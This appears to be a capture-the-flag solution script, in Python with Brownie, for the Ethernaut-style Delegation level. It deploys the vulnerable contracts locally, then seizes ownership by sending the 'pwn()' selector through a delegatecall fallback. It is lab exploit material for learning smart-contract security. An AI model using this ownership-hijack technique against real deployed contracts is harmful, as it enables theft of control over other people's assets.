from brownie import network, Delegate, Delegation
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3


def deploy_delegate(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Delegate.deploy(
        account.address, {"from": account}, publish_source=publish
    )
    print(
        f"Cotntract --Delegate-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_delegation(account, delegate_address):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Delegation.deploy(
        delegate_address, {"from": account}, publish_source=publish
    )
    print(
        f"Cotntract --Delegation-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    print(f"Owner address: {owner_account.address}")
    print(f"Attacker address: {attacker_account.address}")
    delegate_contract = deploy_delegate(owner_account)
    delegation_contract = deploy_delegation(owner_account, delegate_contract.address)
    print(f"Owner of Delegate: {delegate_contract.owner()}")
    print(f"Owner of Delegation: {delegation_contract.owner()}")
    print("<<< ATTACKING >>>")
    pwn_hash = web3.Web3.keccak(text="pwn()")
    print(f"Hash keccak of pwn(): {pwn_hash}")
    w3 = web3.Web3(web3.HTTPProvider("http://127.0.0.1:8545"))
    txn = {
        "from": str(attacker_account.address),
        "to": str(delegation_contract.address),
        "data": pwn_hash,
    }
    txn_hash = w3.eth.send_transaction(txn)
    w3.eth.wait_for_transaction_receipt(txn_hash)
    print("<<< AFTER ATTACK >>>")
    print(f"Owner of Delegate: {delegate_contract.owner()}")
    print(f"Owner of Delegation: {delegation_contract.owner()}")


if __name__ == "__main__":
    main()
